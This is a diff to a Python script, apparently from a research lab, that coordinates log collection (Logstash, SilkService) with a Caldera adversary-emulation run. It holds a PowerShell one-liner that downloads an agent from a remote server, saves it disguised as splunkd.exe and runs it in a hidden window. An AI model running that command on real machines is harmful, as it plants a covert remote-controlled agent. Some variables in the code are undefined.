@@ -22,92 +22,165 @@ import zipfile
 
 save_directory = "C:\\Users\\puma-4\\Downloads"
 
-HOST_IP = '128.226.116.18' # P16 (Prof Gunahua's lab) Host machine IP
+HOST_IP = '128.226.116.18' # P16 (Prof Gunahua's lab) 'JY-Big machine' Host machine IP
 PORT = 9999
 
 def main():
     
-    # Now we can create socket object
-    s = socket.socket()
 
-    # Lets choose one port and start listening on that port
-    PORT = 9900
-    print("\n Server is listing on port :", PORT, "\n")
+    #-----------------------------------------------------------------------------------------------------------------------
+    # 1. Wait and receive message of "start__logstash__silkservice__caldera_agent" from Host
+    s = socket.socket()     # Now we can create socket object
+    PORT = 9900             # Lets choose one port and start listening on that port
+    print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
+    s.bind(('', PORT)) # Now we need to bind socket to the above port 
+    s.listen(10)    # Now we will put the binded socket listening mode
 
-    # Now we need to bind to the above port at server side
-    s.bind(('', PORT))
-
-    # Now we will put server into listenig  mode 
-    s.listen(10)
-
-
-
-    record_time = None 
-    # # Now we do not know when client will concact server so server should be listening continously  
-    while True:
-        # Now we can establish connection with client
-        conn, addr = s.accept()
-        # Receive the ps1-filename data from client side\
-
-        # PW: Also receive command passed from client side separated with comma
-        record_time = conn.recv(1024).decode()
-        record_time = int(record_time)
+    message_to_receive = None 
+    while True: # We do not know when client will contact; so should be listening continously  
+        conn, addr = s.accept()    # Now we can establish connection with client
+        message_to_receive = conn.recv(1024).decode()
         conn.close()
-        print("\n Server closed the connection \n", flush=True)
+        print("\n VM-socket closed the connection\n", flush=True)
         break
 
-    if record_time:
-        print(f"\n From Client Received record_time: {record_time}\n", flush = True )
-        #store_path = os.path.join(nishang_path, ps1_fname)
+    if message_to_receive == "start__logstash__silkservice__caldera_agent":
+        print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
     else:
-        raise ValueError(f"Value-Error with record_time {record_time}")
-
-
-
-    ##################################################################################################################################################################################
-    ##################################################################################################################################################################################
-                
-
+        raise ValueError(f"Value-Error with received message: {message_to_receive}")
+    s.close()
     time.sleep(5)
+    #-----------------------------------------------------------------------------------------------------------------------
+    # 2. Start 
+    #      (2-1) Logstash
+    #      (2-2) SilkService
+    #      (2-3) Caldera-Agent on a Admin-Priviledged Powershell -- since need to get PROCESSSTART of splunkd.exe
 
-    # start running logstash
- 
-    print ('start logstash', flush=True)
+    # (2-1) Start Logstash .........................................................................................
+    print ('Start Logstash', flush=True)
+    #PW: all following commands should run on powershell based on new event trace using sliketw->logstash->es
+    psh = f'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+    logstash_index_cmd= "$env:LOGSTASH_INDEX="+"\"" + ps1_filename +"\"" ""
+    logstash_cmd='C:\\Users\\puma-4\Desktop\\logstash-8.10.0\\bin\\logstash -f C:\\Users\puma-4\\Desktop\\logstash-8.10.0\\config\\logstash-sample.conf'
+    logstash = f"{logstash_index_cmd} ; {logstash_cmd}"
+
+    try :
+        # PW: New terminal for logstash to start listning on logstash port e.g.,5444,
+        spawned_psh_process_logstash = subprocess.Popen([psh, "-Command", 
+                                                         logstash],
+                                                        shell=False, text=True,
+                                                        stdin=subprocess.PIPE,
+                                                        stdout=subprocess.PIPE,
+                                                        stderr=subprocess.PIPE)
+        print("spawned_psh_process_logstash.pid",spawned_psh_process_logstash.pid, flush = True)
+    except:
+        raise RuntimeError("Exception while starting 'spawned_psh_process_logstash'", flush = True)
+
+    #PW: for logstash wait for few sec till logstash will start listening
+    time.sleep(30) 
     
+    # (2-2) Start SilkService .........................................................................................
+    start_silk_service_cmd = f"Start-Service SilkService"
+
+    try:
+        spawned_psh_process_silk_service_start = subprocess.Popen([psh, "-Command", 
+                                                                  start_silk_service_cmd], 
+                                                                  shell=False, text=True,
+                                                                  stdin=subprocess.PIPE,
+                                                                  stdout=subprocess.PIPE,
+                                                                  stderr=subprocess.PIPE)
+        print("spawned_psh_process_silk_service_start.pid",spawned_psh_process_silk_service_start.pid, flush = True)
+    except:
+        raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_start'", flush = True)
+    time.sleep(15)
+
+    # (2-3) Start Caldera Agent (splunkd.exe) on the running Caldera-Server ...........................................
+    #     
+    #     --> this is based on "new_agent_for_caldera_attack_subgraph.py" from Panther-VM
+    #    
+    #    After the log-streaming starts (by receiving a trigger from the Host),
+    #    start the Caldera-Agent the using subprocess-module (which is confirmed to work).
+    #    * IMPORTANT: "Command-Prompt" that runs this python-script has "Administrator Privilege."
+    #    > cmd = "$server=\"http://192.168.122.1:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
+    #    > subprocess.run(["powershell", "-Command", cmd])
+    #    ^ More Details can be found in: 
+    #      "Caldera-Agent Deploy Commands OneLiner (Copy and Paste to Python).txt"
+
+    print("Starting Caldera-agent", flush = True)
+    cmd = f"$server=\"http://{HOST_IP}:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
+    subprocess.run(["powershell", "-Command", cmd])
+    print("Started Caldera-agent", flush = True)
+     # As done in Host Machine's main file,
+     # Wait 40 sec for caldera agent to get the connection with caldera server.
+    time.sleep(40)
+    print("Waited 40 sec for caldera-agent to get connection with caldera-server", flush = True)
+    #-----------------------------------------------------------------------------------------------------------------------
+    # 3. Tell Host that caldera-agent got connection withe caldera-server 
+    
+    print(f'Tell Host that logstash/silk-service/caldera-agent started', flush = True)
+    ss = socket.socket()
+    SEND_PORT = 1100
+    ss.connect((HOST_IP, SEND_PORT))
+    meesage_to_send = "started__logstash__silkservice__caldera_agent"
+    ss.send(meesage_to_send.to_bytes(2,'big'))
+    ss.close()  # CHECK IF NECESSARY
+
+    #-----------------------------------------------------------------------------------------------------------------------
+    # 4. Host will then invoke the operation.  
+    #    Wait and receive message of "terminate__logstash__silkservice" from Host
+
+    s = socket.socket()     # Now we can create socket object
+    PORT = 9900             # Lets choose one port and start listening on that port
+    print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
+    s.bind(('', PORT)) # Now we need to bind socket to the above port 
+    s.listen(10)    # Now we will put the binded socket listening mode
+
+    message_to_receive = None 
+    while True: # We do not know when client will contact; so should be listening continously  
+        conn, addr = s.accept()    # Now we can establish connection with client
+        message_to_receive = conn.recv(1024).decode()
+        conn.close()
+        print("\n VM-socket closed the connection\n", flush=True)
+        break
+
+    if message_to_receive == "terminate__logstash__silkservice":
+        print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
+    else:
+        raise ValueError(f"Value-Error with received message: {message_to_receive}")
+    s.close()
+    time.sleep(5)
+    
+    #-----------------------------------------------------------------------------------------------------------------------
+    # 5. Terminate logstash and silkservice
 
 
+    stop_silk_service_cmd = f"Stop-Service SilkService"
+    try:
+        spawned_psh_process_silk_service_stop = subprocess.Popen([psh, "-Command", 
+                                                                  stop_silk_service_cmd], 
+                                                                  shell=False, text=True,
+                                                                  stdin=subprocess.PIPE,
+                                                                  stdout=subprocess.PIPE,
+                                                                  stderr=subprocess.PIPE)
+        print("spawned_psh_process_silk_service_stop.pid",spawned_psh_process_silk_service_stop.pid, flush = True)
+        print("\nstopped silk-service", flush = True)
+    except:
+        raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_stop'", flush = True)
+    time.sleep(15)
 
-    val, errmsg = logstash_and_silkservice(record_time)
+    spawned_psh_process_logstash.terminate()
+    print(f"TERMINATED spawned_psh_process_logstash {spawned_psh_process_logstash.pid}",flush = True)
+
+    spawned_psh_process_stop.terminate()
+    print(f"TERMINATED spawned_psh_process_stop {spawned_psh_process_stop.pid}")
+    spawned_psh_process_start.terminate()
+    print(f"TERMINATED spawned_psh_process_start {spawned_psh_process_start.pid}")
+
 
     # shutdown fakenet
 
 
 
-    time.sleep(5)
-
-    if val == 1:
-        print ('error on running exe file.', flush=True)
-        print(f"Exception: {errmsg}", flush=True)
-        ep = "c:\\malware\\logs\\error.txt"
-        f1 = open("c:\\malware\\logs\\error.txt", "w",encoding = "utf-8")
-        f1.write(f'error , the executable file can not execute -- {errmsg}')
-        f1.close()
-
-        print ('get wrong files to zip', flush=True)
-        shutil.make_archive('c:\\malware\\log','zip','c:\\malware\\logs')
-        p = 'c:\\malware\\log.zip'
-        if not os.path.exists(p):
-            print ('no zip file for log', flush=True)
-            raise ValueError
-        print ('send error back to host', flush=True)
-        s = socket.socket()
-        s.connect((HOST_IP,PORT))
-        f = open(p,'rb')
-        senddata= f.read(1024)
-        while(senddata):
-            s.send(senddata)
-            senddata = f.read(1024)
-        print ('finished error ', flush=True)
 
         
 
@@ -115,124 +188,6 @@ def main():
 
         
     # Close connection with client
-
-
-##############################################################################################################
-##############################################################################################################
-def logstash_and_silkservice(record_time : int):
-
-    somfunc_start = datetime.datetime.now()
-    f5 = open("c:\\malware\\logs\\processid_command_mapping.txt", "w", encoding = "utf-8")
-
-    #PW: all following commands should run on powershell based on new event trace using sliketw->logstash->es
-    #psh = f'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
-    logstash_index_cmd= "$env:LOGSTASH_INDEX="+"\"" + ps1_filename +"\"" ""
-    logstash_cmd='C:\\Users\\puma-4\Desktop\\logstash-8.10.0\\bin\\logstash -f C:\\Users\puma-4\\Desktop\\logstash-8.10.0\\config\\logstash-sample.conf'
-    logstash = f"{logstash_index_cmd} ; {logstash_cmd}"
-
-    # SilkService 가 etw일것이다
-    start_silk_service_cmd = f"Start-Service SilkService"
-    stop_silk_service_cmd = f"Stop-Service SilkService"
-
-    try :
-        # PW: New terminal for logstash to start listning on logstash port e.g.,5444,
-        spawned_psh_process_logstash = subprocess.Popen([psh, "-Command", logstash],
-                                                shell=False, text=True,
-                                                stdin=subprocess.PIPE,
-                                                stdout=subprocess.PIPE,
-                                                stderr=subprocess.PIPE)
-        print("spawned_psh_process_logstash.pid",spawned_psh_process_logstash.pid)
-        time.sleep(30) #PW: for logstash wait for few sec till logstash will start listening
-        
-        #PW: for logstash-----
-        #PW: for all other commands, run it on another powershell
-        spawned_psh_process_start = subprocess.Popen([psh, "-Command", start_silk_service_cmd], 
-                                                shell=False, text=True,
-                                                stdin=subprocess.PIPE,
-                                                stdout=subprocess.PIPE,
-                                                stderr=subprocess.PIPE)
-        print("spawned_psh_process_start.pid",spawned_psh_process_start.pid)
-
-        time.sleep(15)
-
-        ################################################################################################
-        # JY @ 2023-10-22 :
-        #      Probably send here to client that log-stash and silk-service has been started. 
-        #      so that clinet can start custom caldera - operaton.
-
-
-
-        time.sleep( record_time )
-
-        spawned_psh_process_stop = subprocess.Popen([psh, "-Command", stop_silk_service_cmd], 
-                                                shell=False, text=True,
-                                                stdin=subprocess.PIPE,
-                                                stdout=subprocess.PIPE,
-                                                stderr=subprocess.PIPE)
-        # sout, serr = spawned_psh_process_stop.communicate()
-        # print("stopsilk_out:", sout)
-        # print("stopsilk_err:", serr)
-        print("spawned_psh_process_stop.pid",spawned_psh_process_stop.pid)
-
-        #time.sleep(300)
-
-
-       
-        # (2) Record the spawned-powershell process's pid --> PW: Will this record ps1 file execution??
-      
-        
-        
-        # #######################################################################################            
-
-    except Exception as errmsg :
-        return 1, errmsg
-
-
-    
-    #time.sleep(record_time) # Before closing session, 
-                            # give some time to collect for possibily existent non-cmdlet last command 
-    
-
-    # 이부분도 필요없을듯? 어차피 splunkd.exe processid 아니까.
-    print ('get files to zip', flush=True)
-    shutil.make_archive('c:\\malware\\log','zip','c:\\malware\\logs')
-    p = 'c:\\malware\\log.zip'
-    if not os.path.exists(p):
-        print ('no zip file for log')
-        raise ValueError
-    print ('send back to host', flush=True)
-    s = socket.socket()
-    s.connect((HOST_IP,PORT))
-    f = open(p,'rb')
-    senddata= f.read(1024)
-    while(senddata):
-        s.send(senddata)
-        senddata = f.read(1024)
-    print ('finished everything', flush=True)
-
-    # 다 죽이는것들.
-    spawned_psh_process_stop.terminate()
-    print(f"TERMINATED spawned_psh_process_stop {spawned_psh_process_stop.pid}")
-    spawned_psh_process_start.terminate()
-    print(f"TERMINATED spawned_psh_process_start {spawned_psh_process_start.pid}")
-    spawned_psh_process_ps1.terminate()
-    print(f"TERMINATED spawned_psh_process_ps1 {spawned_psh_process_ps1.pid}")
-    spawned_psh_process_logstash.terminate()
-    print(f"TERMINATED spawned_psh_process_logstash {spawned_psh_process_logstash.pid}")
-    
-
-
-    somfunc_elapsed_time = str(datetime.datetime.now() - somfunc_start)    
-    print (f'Finished somfunc -- Elapsed-Time: {somfunc_elapsed_time}',
-            flush = True)
-    print (f'Finished somfunc -- Elapsed-Time: {somfunc_elapsed_time}',
-            flush = True, file = f5)    
-    f5.close()
-    return 0, None
-
-
-
-
 
 
 
